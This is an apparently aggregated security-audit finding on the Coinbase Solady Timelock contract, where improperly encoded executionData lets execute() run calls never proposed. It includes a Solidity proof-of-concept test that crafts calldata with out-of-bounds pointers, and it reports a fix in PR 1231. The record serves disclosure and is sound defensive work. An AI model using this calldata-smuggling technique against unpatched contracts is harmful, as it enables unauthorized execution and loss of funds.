---
# Core Classification
protocol: Coinbase Solady
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 45417
audit_firm: Spearbit
contest_link: https://github.com/spearbit/portfolio/blob/master/pdfs/Solady-Coinbase-Spearbit-Security-Review-December-2024.pdf
source_link: https://github.com/spearbit/portfolio/blob/master/pdfs/Solady-Coinbase-Spearbit-Security-Review-December-2024.pdf
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

# Audit Details
report_date: unknown
finders_count: 4
finders:
  - Kaden
  - Riley Holterhus
  - Optimum
  - Philogy
---

## Vulnerability Title

Timelock does not enforce proper encoding of executionData

### Overview


The Timelock contract has a bug that allows a proposal to be created with executionData that appears harmless, but actually contains pointers to out-of-bounds calldata. This means that when the proposal is executed, the data referenced by these out-of-bounds pointers can be manipulated to execute arbitrary logic. This could be exploited by a malicious user to cause harm. The recommendation is to ensure that the executionData in the Timelock functions is properly encoded to prevent this issue. The bug has been fixed in PR 1231 and has been verified.

### Original Finding Content

## Severity: Medium Risk

## Context
Timelock.sol#L162

## Description
In the `propose()` and `_execute()` functions of the Timelock contract, the `executionData` is not verified to be properly encoded. This allows a proposal to be created with `executionData` that appears harmless but contains pointers to out-of-bounds calldata. When the proposal is executed, the data referenced by these out-of-bounds pointers can be manipulated to execute arbitrary logic.

For example, the following proof of concept can be added to `Timelock.t.sol` to demonstrate this issue:

```solidity
function returnsBytes(bytes memory b) external payable returns (bytes memory) {
    return b;
}

function test_execute_calldata_OOB() public {
    bytes memory emptyExecutionData;
    timelock.propose(emptyExecutionData, _DEFAULT_MIN_DELAY);
    vm.warp(block.timestamp + _DEFAULT_MIN_DELAY);
    (bool success, ) = address(timelock).call(abi.encodePacked(
        bytes4(keccak256("execute(bytes32,bytes)")),
        abi.encodePacked(
            hex"0100000000007821000100000000000000000000000000000000000000000000", // supported mode
            hex"0000000000000000000000000000000000000000000000000000000000000040", // offset to length of executionData, !
            /*
            The next 32 bytes are the length of the executionData bytes themself.
            By setting the length to zero, the keccak256(executionData) of will match
            the empty proposal, but since the rest of the calldata is set up with values
            out-of-bounds, a call is actually made.
            */
            hex"0000000000000000000000000000000000000000000000000000000000000000",
            hex"0000000000000000000000000000000000000000000000000000000000000020", // offset to length of calls array, !
            hex"0000000000000000000000000000000000000000000000000000000000000001", // length of calls array, !
            hex"0000000000000000000000000000000000000000000000000000000000000020", // offset to calls[0], !
            abi.encode(address(this)), // calls[0] target
            hex"0000000000000000000000000000000000000000000000000000000000000000", // calls[0] value
            hex"0000000000000000000000000000000000000000000000000000000000000060", // offset to calls[0] data length, !
            hex"0000000000000000000000000000000000000000000000000000000000000064", // calls[0] data length, !
            abi.encodeWithSignature("returnsBytes(bytes)", "test") // calls[0] data
        )
    ));
    require(success);
}
```

Running this test demonstrates that additional calls can be added into the calldata during `execute()`, even if they were not included in the initial `propose()`. This behavior could be problematic if a malicious proposer intentionally submits `executionData` with out-of-bounds pointers, and this goes unnoticed until execution.

## Recommendation
Ensure that the `executionData` in the Timelock functions is properly encoded, so all referenced data is fully contained within it.

## Solady
Fixed in PR 1231.

## Spearbit
Verified. There is now a call to `LibERC7579.decodeBatchAndOpData()` in `propose()`, which will revert if the `executionData` is not properly encoded. Since all relevant data is now guaranteed to be contained within the `executionData`, and since the hash must match during `execute()`, it is sufficient that this check is only done in `propose()`.

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Spearbit |
| Protocol | Coinbase Solady |
| Report Date | N/A |
| Finders | Kaden, Riley Holterhus, Optimum, Philogy |

### Source Links

- **Source**: https://github.com/spearbit/portfolio/blob/master/pdfs/Solady-Coinbase-Spearbit-Security-Review-December-2024.pdf
- **GitHub**: N/A
- **Contest**: https://github.com/spearbit/portfolio/blob/master/pdfs/Solady-Coinbase-Spearbit-Security-Review-December-2024.pdf

### Keywords for Search

`vulnerability`

